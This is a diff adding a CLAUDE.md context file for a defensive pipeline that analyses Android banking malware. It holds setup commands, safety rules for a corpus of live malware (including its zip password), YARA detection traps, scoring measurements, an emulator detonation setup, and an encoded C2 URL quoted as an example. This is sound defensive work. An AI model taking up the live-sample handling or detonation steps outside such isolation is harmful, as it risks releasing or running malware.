@@ -1,0 +1,539 @@
+# CLAUDE.md — APK Sentinel / CyberShield
+
+Working context for this repository. Read this before changing anything.
+
+> **Detailed history, measurements and rationale live in
+> [`docs/PROJECT_LOG.md`](docs/PROJECT_LOG.md).** This file is the short version:
+> what the project is, what actually works, and the traps that will waste your time.
+
+---
+
+## 1. What this is
+
+Evidence-driven Android **banking-malware** analysis pipeline, built for the
+**PSB Cybersecurity, Fraud & AI Hackathon 2026** (Bank of India · IIT Hyderabad ·
+DFS, Ministry of Finance · IBA). Target threat: fraudulent APKs impersonating
+Indian banks, UPI apps and government services.
+
+Seven layers, glued by a single evidence record:
+
+| Layer | Purpose | **Verified status** |
+|---|---|---|
+| **L0** Ingestion & triage | Hashing, manifest, icon pHash, certificate, **bank-impersonation check**, routing | ✅ works |
+| **L1** Static analysis | jadx decompile + YARA (source, per-class dex, APK scopes); Ghidra for native | ⚠️ 37% malware-category detection (was 8%); **18 rules still dead** (B29) |
+| **Spine** | Merged `artifacts/<sha256>/evidence.json`, stable evidence IDs | ✅ works (L0+L1 wired) |
+| **L2** Dynamic analysis | Emulator detonation, Frida hooks, mitmproxy | ✅ **demonstrated 2026-08-26**: XBot (`org.merry.core`) beaconed its C2 on launch through the real pipeline — first non-zero behavioural capture (§10). sentinel30 AVD boots, DroidBot operates the real UI, Frida/mitmproxy/tcpdump capture, **isolation IS enforced+verified** (`orchestrator.py:873/877`), and mitm now **contains** unknown egress. Gaps: SBI-style payloads still need SUBMIT-handler RE; incoming-SMS hook missing (§10) |
+| **L3** ML classifier | Calibrated maliciousness prior, bounded ±10 | ⚠️ models exist (`lamda_lgbm`, `banking_lgbm`); **unified pipeline-extracted dataset** in progress (2026-08-24) to kill train/serve skew — see §9 |
+| **L4** GenAI reasoning | Verified deobfuscation + report generation | ✅ works — OpenRouter free tier, execution verifier, $0.00/call |
+| **L5** Hybrid scoring | Auditable additive score + smoking-gun gates | ⚠️ built; **gates refuse to arm** while weights are unsupported (T24) |
+| **L6** Output & UX | Dashboard, report, IOC export | ✅ works — STIX 2.1 / CSV / YARA / Sigma, FastAPI, HTML report |
+
+🔴 **Every score the system currently emits is stamped `unsupported` and is not
+usable as evidence.** That is not a bug: A4 measured that at `n_benign = 4` the
+weights are sign-inverted (T24/B30), so L5 reports what it was given and refuses
+to arm a gate. The benign corpus is what changes this — see §7.
+
+**The differentiator is L0 bank-impersonation detection.** MobSF answers "is this app
+insecure?"; this answers "is this app pretending to be your bank, and how do we know?"
+
+---
+
+## 2. Environment — read this first
+
+**Dependencies live in the repo-local `env/` venv.** They were previously installed against
+`/usr/bin/python3.13`, which a Fedora upgrade deleted — taking androguard, yara-python,
+imagehash and pyzipper with it. Never depend on a system interpreter again.
+
+```bash
+source source_env.sh          # sets $SENTINEL_PYTHON, JADX_DIR, JDK17_HOME, ANDROID_SDK_ROOT
+$SENTINEL_PYTHON L0/ingest.py <apk>
+```
+
+If `source_env.sh` warns that no interpreter has the dependencies, rebuild:
+
+```bash
+python3 -m venv env && ./env/bin/pip install -r requirements.txt && ./env/bin/pip install pytest
+```
+
+`source_env.sh` derives all paths from its own location — do not reintroduce absolute paths.
+
+| Tool | State |
+|---|---|
+| jadx + bundled JDK 17 | ✅ `tools/jadx`, `tools/jdk17` |
+| **Ghidra** | ❌ absent — native track degrades gracefully; only ~12% of samples have native libs |
+| Android SDK, emulator, adb, frida-server, `/dev/kvm` | ✅ all present |
+| **`sentinel` AVD** | ❌ core-dumped on boot (T14) — **replaced** by ✅ `sentinel30` (android-30 Google-APIs x86_64, QEMU/ranchu on `/dev/kvm`, data at `/mnt/SharedData/cybershield-data/avd/sentinel30.avd`). Boot fixed 2026-08-25 (dropped `-writable-system`); re-verified live 2026-08-26: boots ~15–20s, `adb root` + guest `iptables`/`nc`/ping work, isolation enforces+verifies. Detonates real malware (§10) |
+
+---
+
+## 3. Commands
+
+```bash
+source source_env.sh
+
+$SENTINEL_PYTHON L0/ingest.py <apk>            # -> L0/artifacts/<sha256>/evidence.json
+$SENTINEL_PYTHON L1/l1.py <apk>                # -> L1/artifacts/<sha256>/analysis.json
+                                               # both also fold into artifacts/<sha256>/evidence.json
+$SENTINEL_PYTHON tools/debug/summarize_results.py <apk>
+$SENTINEL_PYTHON -m pytest tests/ -q
+
+# Corpus (safe, resumable — see §4). Full run: ~57 min, 705 samples.
+# --l3 also writes each sample's L3 prior to its spine (resume re-runs when the
+# model fingerprint changes — T29's gate applied to L3). Refuses to start if
+# the model/vocab are absent rather than silently shipping a no-ML corpus.
+$SENTINEL_PYTHON tools/corpus_run.py --dry-run
+$SENTINEL_PYTHON tools/corpus_run.py --match novTargetedIndianBanks
+$SENTINEL_PYTHON tools/corpus_run.py --l3               # everything + L3; re-run to resume
+$SENTINEL_PYTHON tools/corpus_summary.py             # newest run's report
+
+# Benign corpus (I14) and the weights L5 spends
+$SENTINEL_PYTHON tools/fdroid_fetch.py select --n 600 && \
+$SENTINEL_PYTHON tools/fdroid_fetch.py download
+$SENTINEL_PYTHON tools/corpus_run.py --corpus-root "$SENTINEL_DATA_ROOT/fdroid/apks" \
+                                     --source loose --label benign_fdroid --l3
+$SENTINEL_PYTHON tools/corpus_labels.py build --benign-root "$SENTINEL_DATA_ROOT/fdroid/apks" \
+                                              --benign-id benign_fdroid
+$SENTINEL_PYTHON tools/rule_firing_report.py         # A4 — read the support stamp (T24)
+
+# Scoring, calibration, evaluation
+$SENTINEL_PYTHON tools/fit_calibration.py --apply    # refuses below n_benign=100
+$SENTINEL_PYTHON L5/validate_policy.py               # blocks gates on unmeasured rules
+$SENTINEL_PYTHON L5/l5.py <sha256> --explain         # the audit trail
+$SENTINEL_PYTHON L5/l5.py --all                      # score every spine, idempotent
+$SENTINEL_PYTHON tools/evaluate.py --ablation --folds 5
+
+# L3 (needs ~6 GB), L4, L6
+$SENTINEL_PYTHON L3/fetch_lamda.py
+$SENTINEL_PYTHON L3/train.py --train-until 2022
+$SENTINEL_PYTHON L4/deobfuscate.py <sha256> --src L1/artifacts/<sha256>/jadx_src
+$SENTINEL_PYTHON L6/report.py <sha256> --out report.html
+$SENTINEL_PYTHON L6/export.py <sha256> --format stix,csv,yara,sigma --out-dir /tmp/x
+$SENTINEL_PYTHON -m uvicorn L6.api:app --host 127.0.0.1 --port 8000   # localhost only
+
+# Disk. corpus_run disposes of jadx_src itself; direct l1.py runs do not (T18).
+$SENTINEL_PYTHON tools/reclaim_disk.py --dry-run
+```
+
+---
+
+## 4. 🔴 Malware corpus — safety rules
+
+`corpus/malware_raw/` holds **2.0 GB of live Android malware** in **two populations**:
+
+| Population | Count | State at rest |
+|---|---:|---|
+| Zip members (203 archives) | 371 | password-protected (`infected`), 148 AES |
+| **Loose APKs in `android-malware/`** | **328** | ⚠️ **unencrypted** (upstream repo ships them this way) |
+| **Total candidates** | **699** | |
+
+Code that iterates only the zips silently analyses half the corpus. `tools/corpus_run.py`
+covers both. Non-negotiable:
+
+1. **Never commit.** `corpus/` is in `.gitignore`.
+2. **Never bulk-extract.** Samples stay inside password-protected zips at rest
+   (password `infected`; use `pyzipper` — many members are AES).
+3. **One at a time.** Read a member into memory (`APK(data, raw=True)`) or extract to a
+   temp dir and delete in a `finally`. Never `extractall`.
+4. **Never execute.** Only androguard, zipfile, YARA and jadx-under-JVM touch sample bytes.
+5. **Detect APKs by `PK\x03\x04` magic, not extension** — 45% of members are extensionless.
+6. No detonation until the emulator boots *and* networking is host-only with a snapshot.
+
+**India-targeted samples — 12, across three impersonated entities** (the demo set):
+
+| Archive | Impersonates |
+|---|---|
+| `AndroidMalware_2021/novTargetedIndianBanks.zip` | `com.sbi.complaintregister` / "SBI Quick Support" |
+| `AndroidMalware_2020/fakeAarogyaSetu.zip` | 4× "Aarogya Setu" (Indian gov app) |
+| `AndroidMalware_2021/mayJioTarget.zip` | 3× India COVID/Jio lures |
+| **`AndroidMalware_2021/sepTaxPayer.zip`** | **"iMobile" / `direct.uujgiq.imobile` — ICICI namespace squat, SMS trifecta** |
+| **`AndroidMalware_2022/Sep_infoStealer.zip`** | **3× "ICICI Rewards" under `com.example.test_app`** |
+
+The last two rows were **found by the pipeline** during the first full corpus run, not
+hand-picked (Finding B24).
+
+---
+
+## 5. Conventions
+
+- Layer-local artifacts keyed by SHA-256: `<LAYER>/artifacts/<sha256>/`.
+- **The merged spine is `artifacts/<sha256>/evidence.json`** (top level, not under a layer).
+  Written *only* through `spine.update_layer()`, which merges one layer and replaces the file
+  atomically. Never write it directly; never read-modify-write another layer's block.
+- All findings share the `L1Finding` schema (`L1/schema.py`): `engine`, `category`,
+  `severity`, `evidence`, `location`, `mitre_techniques`, `observation`, `detail`.
+  In the spine each also carries `layer`, `id` (`F001`…) and `fingerprint`.
+  **Cite `id`; diff on `fingerprint`** — ids shift when findings are inserted, fingerprints
+  do not.
+- `observation`: `inferred` (static) → `observed` (runtime) → `confirmed` (analyst).
+- Layer status is a `LayerStatus`, never the string `pending`. `partial` is real and means
+  "ran, with a coverage gap" — the gap belongs in `analysis_gaps`.
+- Style: `from __future__ import annotations`, dataclasses, `pathlib`, type hints.
+- **Regression baselines are frozen** in `tests/baseline/` (`pre_A2/` for L1 findings,
+  `pre_A6/` for L0 impersonation). Use the **on-disk artifacts** as the oracle, never a
+  table in a doc — *and check their mtime first* (see T16).
+
+---
+
+## 6. 🔴 Traps — things already discovered the hard way
+
+Each of these cost real time. Do not rediscover them.
+
+| # | Trap |
+|---|---|
+| **T1** | **YARA `uint32()` is little-endian.** 27 of 43 rules gated on `uint32(0) == 0x504B0304`, which is **never true** for a ZIP. Now `uint32be(0) == 0x504B0304`. If you add a rule, use `uint32be`. |
+| **T2** | **Never concatenate files for YARA.** Batching 500 `.java` files let conditions like `3 of ($wm*) and 2 of ($phish*)` be satisfied by strings scattered across unrelated files — this caused a **100% false-positive rate on benign apps**. `scan_sources` scans per file. Batch size is a *correctness* parameter. |
+| **T3** | **A raw APK scan is structurally near-blind** — everything is deflated. `scan_apk` scans the container (for ZIP-structure rules) **plus decompressed members**. Both passes are required; removing either kills a rule class. |
+| **T4** | **androguard 4.x returns `asn1crypto` certs**, not `cryptography` ones. Use `cert.sha256`, `cert.issuer.native`, `cert.dump()` — **not** `cert.public_bytes()`. The old code's `except` hid the failure behind a plausible-looking result. See `L0/certinfo.py`. |
+| **T5** | **`apk.get_app_icon()` defaults to `max_dpi=65536`**, which picks the adaptive-icon **binary XML** that PIL cannot decode. Icon extraction silently failed on ~half of all APKs. Use the dpi ladder in `extract_icon_phash`. |
+| **T6** | **`self_signed` is a ~100% base-rate flag** — every Android APK is self-signed (22/22 locally, including all benign). It carries **zero weight alone**. Only signer *anomalies* discriminate. |
+| **T7** | **Never fuzzy-match app labels.** `difflib` scored `"duckAssist"` vs the Income Tax alt-label `"iAssist"` at 0.706 and raised a **critical bank-impersonation finding on a benign note-taking app**. Use whole-token / whole-phrase matching only (`L0/impersonation.py`). |
+| **T8** | **Never auto-derive brand tokens.** Derivation proposes `assist` for Income Tax (recreating T7), `phone` for PhonePe, and Devanagari `बैंक` for every bank. `brand_tokens` in the whitelist are **hand-curated**. |
+| **T9** | **22 of 39 original whitelist package names return HTTP 404** — fabricated identifiers. Only `package_verified: true` entries may carry a `vendor_prefixes` entry, or you seed a fake namespace. |
+| **T10** | **`L0/ingest.py:run_l0` destructively overwrites `evidence.json`** with `l1`…`l6` = pending on every run. The evidence spine must **not** live in `L0/artifacts/`. |
+| **T11** | **Rule severity is case-sensitive.** 35 rules use `"Critical"`/`"High"`; the map was lowercase, silently downgrading them all to MEDIUM. Fixed in `_severity()`. |
+| **T12** | **Set `category` in rule meta.** The name-regex fallback left `clipboard_hijack`, `notification_abuse`, `screen_capture`, `packing_obfuscation`, `messaging_c2` **unreachable** — hiding real detections as `other`. |
+| **T13** | **AES zip members have `CRC-32 = 0`** (WinZip AE-2 mandates it). Any resume/dedup key based on CRC degenerates for 40% of the corpus. |
+| **T14** | **The `sentinel` AVD core-dumps on boot** — not OOM, not a process-group kill, not Vulkan. L2 is untestable until fixed. Do **not** rabbit-hole here; it ate a research agent's warning budget for a reason. |
+| **T15** | **A metric defined in prose and re-implemented in code will drift.** `MALWARE_CATEGORIES` was rewritten with 14 categories against a criterion of 9, silently redefining every recorded before/after number. It is now pinned by a test. Widening it requires a re-baseline, not a commit. |
+| **T16** | **An artifact directory is not a source of truth unless you check its provenance.** The malware `L0/artifacts/` are pre-A6 and still read `verdict: unknown` on all 8 India samples. Anything derived from them records a picture that was already known to be wrong. Check mtimes, or regenerate. |
+| **T17** | **A green "ready" banner over a broken environment is worse than a red one.** `source_env.sh` fell through to a dependency-less `python3` and printed success; the failure surfaced much later as a confusing `ModuleNotFoundError`. It now warns. Dependencies live in `env/`, not in a system interpreter. |
+| **T18** | **jadx output, not samples, is what fills the disk.** ~112 MB of `jadx_src` per sample vs a ~2 MB APK — ~78 GB projected over the corpus, against ~13 GB free. `corpus_run.py --keep-decompiled none` reclaims it per sample. A disposal policy aimed at the samples protects 1.45 GB and ignores 78. **The corpus runner is not the leak** — it disposes correctly. Running `L1/l1.py <apk>` *directly* has no disposal policy (deliberately: a manual run is one you want the sources for), and eight such runs on the test apps had quietly accumulated 904 MB. Sweep with `tools/reclaim_disk.py`. |
+| **T19** | **Never estimate a rate from the hand-picked set.** "4 of 8 banking trojans undetected" (50%) became **92%** at corpus scale. Eight samples chosen because they were interesting are not a sample of anything. |
+| **T20** | **A member is not the container.** Behaviour rules gated on `uint32be(0) == 0x504B0304` can never match a `classes.dex` (`dex\n035`), and the container itself is deflated — so the gate made the scanner blind to the one place the app's strings live in plaintext. `scan_apk` uses a **separate member ruleset** with container gates stripped. |
+| **T21** | **A dex is the whole app concatenated — scan it per class.** Whole-dex scanning is T2's batch-blob bug one level down: it made an expense tracker match an OTP stealer *and* a ransomware rule. Conjunction only means something inside one class. |
+| **T22** | **A dex stores API calls as invoke operands, not string literals.** A per-class buffer of names + `const-string` only found **0 of 4** SMS APIs in a confirmed SMS trojan; adding invoke/field operands found all four. |
+| **T23** | **`AccessibilityService` is a ~100% base-rate token** — present in 4/4 benign apps, exactly like `self_signed` (T6). Never key an accessibility rule on it alone; require a combination. |
+| **T24** | 🔴 **At `n_benign = 4` the computed weights are sign-inverted, not merely imprecise.** A4 prices **32 of 45 signals negative** — as evidence of being *benign* — including `l0:brand_claim`, the differentiator, at **−1.90**. The top-weighted signal in the system is `APK_Valid_Structure_Check` (+2.85), i.e. "is a well-formed ZIP". The Jeffreys 95% upper bound on 0/4 is **0.445**, so every historical "0/4 benign false positives" claim means "somewhere between 0% and 44%". The requirement is closed-form: with `b=0`, `w>0` iff `B > 0.5·(M−m+0.5)/(m+0.5) − 0.5`, so **B ≥ 213**. Never quote a weight without its support stamp. |
+| **T25** | **A dead rule that self-matches is not broken.** Compile a rule alone against a buffer of its own declared strings: if it fires, its condition is fine and the *corpus* lacks the vocabulary co-located in one class. All 18 dead rules pass this test (B31), refuting the "stripped/malformed" hypothesis. Conflating "rule is wrong" with "behaviour is absent here" sends you rewriting rules that were never wrong. |
+| **T26** | **The LLM will confidently mis-decode a string, and RAG cannot catch it.** In model selection, `north-mini-code` decoded `aHR0cDovLzE5Mi4xNjguMS4xMDAvZ2F0ZS5waHA=` as `.../get.php`; it is `gate.php`. Retrieval grounds claims about the *threat landscape*, not about *this sample*. Anything a decoder, parser or hash can settle must be verified mechanically before it reaches a report. |
+| **T28** | **A behaviour rule matching the raw ZIP container proves nothing, and the container ruleset silently included 33 of 51 rules.** `scope = "both"` kept every behaviour rule in the container pass. Measured: `Android_BFSI_Accessibility_Driven_Exfil` matched **82 times at container scope on benign apps and 0 on malware**, turning +0.007 discrimination into −0.090. Benign F-Droid apps have a median 3,519 decompiled files against malware's 426, so a bigger archive simply offers more raw bytes for a coincidental hit. The container pass now takes only `scope = "apk"`. |
+| **T29** | **A scanner behaviour change that edits no `.yar` file leaves `ruleset_version` unchanged — and `corpus_run` resumes on it.** The T28 fix would have shipped while every sample was skipped as already-done. `ruleset_version()` now hashes `SCANNER_BEHAVIOUR_VERSION` too. Bump it whenever the scanner changes what a given rule set produces. |
+| **T30** | 🔴 **A step that stops early and exits 0 is indistinguishable from one that finished, and every number downstream inherits it.** `corpus_run` halted on its disk floor at 245/604 benign, returned 0, and `rerun_pipeline.sh` — whose entire design is "each step gated on the previous succeeding" — went on to build labels, weights, calibration, 1248 scores and an evaluation over a corpus that was **59% pre-T28 spines**. It printed a clean headline (AUROC 0.9261) and `unsupported=False`. Nothing errored. Early stop now returns **3**, and the pipeline independently re-checks `remaining=0` via `--dry-run` before measuring anything. Provenance is `l1.summary.ruleset_version`; **`l5.summary.ruleset_version` is stamped at scoring time on every spine and is not evidence that L1 was re-run.** |
+| **T31** | **The disk floor was watching the wrong filesystem.** One `--min-free-gb` guarded the repo, but the heavy writer is jadx (T18) and its output root is now `$SENTINEL_L1_ARTIFACTS` on the 276 GB NTFS partition. An 8 GB floor blocked a run whose repo writes total ~30 MB, while the filesystem doing the real work had 255 GB free and was never checked. Floors are now split: `--min-free-gb` for the L1 root, `REPO_MIN_FREE_GB = 2.0` for the repo. Measured before moving: 17.41 s on ntfs-3g vs 17.26 s on ext4 for the same APK, 6918 files either way, and the mount is case-sensitive — obfuscated `a.java`/`A.java` do not collide. |
+| **T27** | **F-Droid cannot validate the accessibility or BFSI rule classes.** Measured across all 4178 packages: **5** declare an accessibility service, **79** declare any SMS permission, and **zero** are commercial banking apps. It is also entirely F-Droid/developer-signed, so `certificate_anomaly` is ~0 by construction and any cert weight measured against it is an **upper bound**. Growing B fixes the arithmetic (T24); it does not make these rule classes tested. |
+
+---
+
+## 6.5 🔄 Re-measurement in flight (relaunched 2026-08-12 18:51 UTC)
+
+To check on it, or to restart it if the machine went down:
+
+```bash
+source source_env.sh
+tail -f "$(ls -t "$SENTINEL_DATA_ROOT"/pipeline_*.log | head -1)"   # watch
+nohup tools/rerun_pipeline.sh > "$SENTINEL_DATA_ROOT/pipeline_driver.log" 2>&1 &  # restart
+```
+
+That single command does the rest: benign re-run → malware L3 pass → **completeness checks**
+(both corpora, both with `--l3`) → labels → A4 → calibration → policy validation → score →
+evaluate, each step gated on the previous succeeding, ending with a headline block. The L3
+pass matters: the malware re-run under `26f6f6f1d646` predates the L3 step, so its spines
+carry no `l3` layer until the pipeline re-measures them with `--l3`; the completeness checks
+then refuse to measure a corpus whose `ok` entries lack a current L3 stamp.
+
+### State at relaunch
+
+| | |
+|---|---|
+| Malware corpus | ✅ **re-run complete** under `26f6f6f1d646` — 640 ok |
+| Benign corpus | 🔄 **245 / 600 done**, 355 running; resume state in `corpus/run_index_benign_fdroid.json` |
+| Everything downstream | 🔴 **must be discarded and recomputed** — see below |
+
+🔴 **The 2026-08-12 downstream artifacts are contaminated and must not be quoted.** The first
+attempt halted at 245/604 benign and reported success anyway (T30), so
+`rule_weights_20260812.json`, `rule_firing_20260812.md`, `evaluation_20260812.json` and all
+1248 `L5/artifacts/*/score.json` were computed over a benign set that was **59% pre-T28**.
+Its headline — AUROC 0.9261, `unsupported=False`, benign median 32.0 — is not a result. The
+re-run overwrites all of them. `L5/policy.yaml` is unaffected: the re-fit landed on the same
+`s0`/`temperature`, so it is byte-identical to the last commit.
+
+🔴 **Resume without `--force`.** `--force` is `index = {}` — it discards the resume index and
+restarts from zero. The gate that makes it unnecessary is `ruleset_version`: resume skips a
+sample only when it is `ok`/`skipped` **and** stamped with the current ruleset, so every
+sample is guaranteed to be measured under the fixed scanner without it. `rerun_pipeline.sh`
+passed `--force` until 2026-08-12 while this file claimed it did not; it now genuinely omits it.
+
+### Why the re-measurement exists
+
+`ruleset_version` moved `d3777011c971 → 26f6f6f1d646` when behaviour rules were stopped from
+matching the raw ZIP container (T28). Every number currently in `docs/` and `README.md` was
+computed over spines containing container-scope false positives, so they are **stale but not
+wrong-in-kind** — malware is unaffected (verified, B38), and the change lands entirely on the
+benign side.
+
+### The comparison points are frozen, so the result will be a diff
+
+- `tests/baseline/pre_I14/` — A4 at `n_benign = 4` (32 of 45 signals negative)
+- `tests/baseline/pre_T28/` — A4 and evaluation at `B = 604`, **before** the container fix
+
+```bash
+$SENTINEL_PYTHON tools/compare_measurements.py weights \
+    tests/baseline/pre_T28/rule_weights_B604_precontainerfix.json \
+    L5/weights/rule_weights_<new>.json
+$SENTINEL_PYTHON tools/compare_measurements.py eval \
+    tests/baseline/pre_T28/evaluation_B604_precontainerfix.json \
+    docs/reports/evaluation_<new>.json
+```
+
+**Predictions recorded before the re-run** (check them, report misses):
+`accessibility_abuse` benign hits fall from 100/604 toward ~a quarter; the 34% benign
+malware-category rate falls with it; `Android_BFSI_Accessibility_Driven_Exfil` goes from −1.47
+to roughly non-negative; malware-side numbers do not move at all.
+
+### 🔴 A decision waiting, not a task
+
+`CICMalDroid Banking` is downloaded, extracted and audited: **2,505 banking-labelled APKs** at
+`$SENTINEL_DATA_ROOT/cicmaldroid/Banking/`. It is *not* registered or analysed, and that is
+deliberate — folding it in is a corpus-composition choice that changes every number in the
+project, so it needs a human.
+
+Adding it takes the malware set from **640 → 3,145**, of which ~80% would be banking. That
+would:
+
+- recompute every A4 weight against a different malware population;
+- make "malware" mean "mostly banking trojans", so the India-vs-general-malware comparison
+  (currently 99.5 vs 88.0 median) stops meaning what it means today;
+- cost roughly **13 hours** of analysis (2,505 × ~19 s).
+
+Three defensible options:
+
+1. **Keep it separate.** Analyse it, label `subclass: banking`, use it only to train and
+   evaluate the banking classifier. The main corpus and all headline rates stay comparable to
+   everything already recorded. *Least disruptive, and what the plan assumed.*
+2. **Fold it in.** One corpus, far more banking signal, but every prior measurement becomes
+   incomparable and the log has to say so loudly.
+3. **Sample it.** Take a few hundred to bring banking representation up without swamping the
+   population.
+
+```bash
+# whichever is chosen, this is the analysis step (13 h for the full set)
+$SENTINEL_PYTHON tools/corpus_run.py --corpus-root "$SENTINEL_DATA_ROOT/cicmaldroid/Banking" \
+                                     --source loose --label banking_cicmaldroid
+$SENTINEL_PYTHON tools/corpus_labels.py build \
+    --benign-root "$SENTINEL_DATA_ROOT/fdroid/apks" --benign-id benign_fdroid \
+    --malware-root "$SENTINEL_DATA_ROOT/cicmaldroid/Banking" \
+    --malware-id banking_cicmaldroid --malware-subclass banking
+```
+
+3.7% of its filenames do not match their content hash (B39). Harmless here — labels bind to the
+computed hash — but its stated identifiers cannot be used to cross-reference other corpora.
+
+## 7. Where things stand
+
+### Landed and measured
+
+**L1 finding quality** — endianness fix (T1), per-file scanning (T2), additive APK member
+scanning (T3), one finding per `(rule, sample)` with breadth as `detail` fields, structural
+cross-scope dedup via `merge_findings()`, category/severity fixes (T11, T12), jadx timeout
+salvage, combo engine surviving corrupted archives.
+
+**L0 impersonation** — correct certificate parsing + signer-anomaly classification
+(`L0/certinfo.py`), icon dpi ladder (T5), whole-token/phrase brand matching
+(`L0/impersonation.py`), curated `brand_tokens` for 39 entities, **Aarogya Setu added**
+(4 of 8 India samples impersonate it), verdict is now a function of findings rather than of
+`matched_bank`.
+
+**Evidence spine (A1)** — `spine.py`: merged record at top-level `artifacts/`, single atomic
+writer, `LayerStatus` enum, ordinal ids + insertion-stable fingerprints, per-layer coverage
+and derived `analysis_gaps`. L0 impersonation and certificate findings are **promoted into
+the unified findings array** (`L0/promote.py`), so the India differentiator finally has an
+evidence ID for L5 to score and L6 to cite. 28 tests in `tests/test_spine.py`.
+
+**Corpus runner (A3)** — `tools/corpus_run.py` + `tools/corpus_summary.py`. Both populations,
+one member at a time, resumable without decrypting, `jadx_src` reclaimed per sample (T18).
+First full run: **705 samples in 57 min, disk flat**.
+
+| Measurement | Before | After |
+|---|---|---|
+| Malware-category findings on benign apps | 5 (incl. ransomware + overlay on an expense tracker) | **0 / 4** |
+| India-targeted samples flagged by L0 | **0 / 8** (`verdict: unknown`) | **8 / 8**, 5 critical |
+| Certificate anomalies: India malware vs benign | n/a (parsing broken) | **8/8 vs 0/4** |
+| Other (non-India) malware flagged | n/a | 12 / 13 |
+| Real banking trojans with a malware-category L1 finding | 1 / 8 | **4 / 8** |
+| **India-targeted samples known in the corpus** | 8 (hand-picked) | **12** (4 found by the pipeline, B24) |
+| **Malware-category detection, full corpus** | *believed 50%* → measured **8%** (B25) | **37% (238 / 649)** — B1 |
+| `sms_intercept` findings across the corpus | **0 / 651** | **197 / 649 (30%)** |
+| `accessibility_abuse` findings | **0 / 651** | **25 / 649** |
+| Benign malware-category findings (held) | 0 / 4 | **0 / 4** |
+
+**Detection repair (B1)** — root cause was T20/T21/T22: rules gated on ZIP magic could never
+match the dex, and naive whole-dex scanning reintroduced T2's false positives. Fixed with a
+separate member ruleset + per-class dex buffers + `L1/yara_templates/apk_bfsi_primitives.yar`,
+8 rules authored from measured per-class API co-occurrence (50 malware vs 4 benign).
+
+### Open
+
+1. 🔴 **18 of 51 rules still fire on nothing** (B29) — including **both ransomware rules**
+   (`ransomware` is 0/649 on a corpus that contains ransomware) and **every India-specific
+   legacy rule**. B1 took detection from 8% → 37% by adding the BFSI rule file, i.e. by
+   routing *around* the broken rules rather than repairing them. India detection currently
+   comes from L0 impersonation plus the new BFSI primitives, not from
+   `apk_india_banking.yar`. Each dead rule needs the same treatment: mine real per-class
+   co-occurrence, rewrite the condition, re-validate against benign.
+2. **40% of the corpus does not fully decompile in 180 s** (`decompilation_partial`). This
+   confounds item 1: "the rule missed it" and "jadx never produced the file" are different
+   facts, and A4 must separate them before any weight it computes means anything.
+3. **3.8% of samples die at L0** on `ResParserError` (B26) — androguard vs malformed UTF-16
+   in resource tables, which is a documented anti-analysis technique.
+4. ~~**Rule-firing report (A4)**~~ — ✅ done, `tools/rule_firing_report.py`. Its result is
+   T24/B30: 32 of 45 signals priced negative at `n_benign = 4`.
+5. ~~**L2 emulator boot** (T14)~~ — ✅ fixed (sentinel30) and **demonstrated 2026-08-26**:
+   XBot beaconed its C2 through the real pipeline (§10). Still owed: a BFSI hook pack —
+   above all an **incoming-SMS** hook (the pack only hooks outgoing `sendTextMessage`, but
+   XBot-style theft is on incoming SMS); accessibility / notification-listener hooks. L2 has
+   no spine producer yet. **Detonation of any sample is user-approved.**
+6. **Stale malware `L0/artifacts/`** (pre-A6, T16) — largely superseded by the corpus run,
+   but the pre-A6 files remain.
+7. ~~**No L3 model is trained.**~~ STALE — models exist (`L3/model/lamda_lgbm.joblib`,
+   `L3b/model/banking_lgbm.joblib`). Superseded 2026-08-24 by the **unified
+   pipeline-extracted dataset** (§9): the LAMDA model has train/serve skew (our extractor
+   reproduces only 0.4–1.8% of LAMDA's columns), so L3 is being retrained on a
+   corpus-derived vocabulary our own pipeline emits. `l3` is still `not_attempted` on the
+   corpus spines — batch-wiring into `corpus_run.py`/`run.py` is pending.
+8. **The benign corpus does not contain the class of app most likely to be a false positive**
+   (T27): F-Droid has 5 accessibility apps, 79 SMS apps and **zero** commercial banking apps
+   repo-wide. Growing B fixes the arithmetic, not the coverage. The named mitigation is a
+   separate hard-negative BFSI panel, reported separately and never merged into B.
+
+### The nine predictions, recorded before the benign corpus landed
+
+Written down in `docs/PROJECT_LOG.md` §6.6 and §6.7 so the result is a diff rather than a
+recollection. The two that decide whether B30's diagnosis was right:
+
+- **P1** SBI Quick Support moves from **Informational (18)** to High or Critical.
+- **P8** `india_malware` median rises **above** the general malware median
+  (currently 16.0 vs 35.5 — the differentiator is anti-correlated with the score).
+
+If those do not move, the diagnosis was wrong and the log says so.
+
+### Decided direction (from a two-agent research debate; see PROJECT_LOG §1)
+
+- Build order: **spine → L5 scoring + L6 minimal → L3 → L2 → L4 threaded throughout**.
+- **The LLM contributes zero points to the score** — it generates evidence and explanation.
+- The proposal's `0.45·rules + 0.30·ml + 0.25·llm` blend is **replaced** by an auditable
+  additive scheme with a versioned YAML policy; smoking-gun gates are the *primary*
+  mechanism, not an override.
+- **L3 trains on LAMDA** (HuggingFace `IQSeC-Lab/LAMDA`, MIT, ungated) as a *generic*
+  maliciousness prior bounded to ±10 points — LAMDA is ~99.6% non-banking, so it must not
+  make banking claims. AndroZoo/Drebin/MalRadar are unobtainable on this timeline.
+- The mitmproxy **"response hijacking" claim is deleted**: FCM commands ride
+  `mtalk.google.com:5228` over a binary protocol and never traverse an HTTP proxy.
+- **Claim discipline:** *"we encode India-specific detection logic and validate it against
+  real India-targeted samples and published 2026 IOCs"* — not "we detect Indian banking
+  trojans in the wild".
+
+---
+
+## 8. Working agreement
+
+The user runs this as a four-domain loop: **research → plan → implement → test**, one phase
+at a time, with **no code written before a plan has been reviewed**, and no moving to the
+next phase below ~99% confidence in the current one.
+
+Practical consequences:
+
+- Plans go in `docs/plans/`; reviews are recorded in `docs/PROJECT_LOG.md`.
+- **Measure before claiming.** Every number in the docs above was produced by running
+  something. Predictions in plans are written as falsifiable, then checked.
+- **Freeze a baseline before touching a detector**, then diff against it.
+- When a fix arms a code path that never previously executed, **assume it will produce a
+  false positive** and test the benign set immediately — that is exactly how T7 was caught.
+
+---
+
+## 9. Update 2026-08-24 — L2 re-verified, L3 unified dataset
+
+### L2 is MVP-ready (correcting §1/§2/§6)
+Re-verified by reading the code and the reliability log. The core-dumping `sentinel` AVD
+(T14) was replaced by **`sentinel30`**. `docs/l2_droidbot_reliability_log.md` records 3/3
+live runs where DroidBot operates the SBI sample's real `MainActivity`. Full flow in
+`orchestrator.run()`: `enforce_isolation()` (**called at line 873**, iptables DROP-all
+except loopback+`10.0.2.0/24`, DNAT 80/443→mitmproxy) → `verify_isolation()` (line 877,
+fail-closed: ping 8.8.8.8 must FAIL + proxy reachable) → mitmdump + tcpdump → frida-server →
+install/grant/accessibility/honeypot → DroidBot + Frida re-attach-by-PID loop → dynamic.json
